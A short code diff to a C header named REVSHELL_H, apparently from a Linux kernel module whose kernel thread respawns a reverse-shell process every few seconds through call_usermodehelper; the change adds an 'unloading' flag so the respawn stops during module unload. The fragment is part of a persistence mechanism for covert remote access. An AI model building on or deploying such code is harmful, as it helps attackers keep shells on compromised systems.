@@ -1,5 +1,6 @@
 #ifndef REVSHELL_H
 #define REVSHELL_H
+extern atomic_t unloading;     /* top of file */
 
 #define CHECK_INTERVAL 5          
 
@@ -37,7 +38,7 @@ static int __shell(void *data)
         }
         rcu_read_unlock();
 
-        if (!alive && !kthread_should_stop())
+        if (!alive && !kthread_should_stop() && !atomic_read(&unloading))
             call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 
         ssleep(CHECK_INTERVAL);
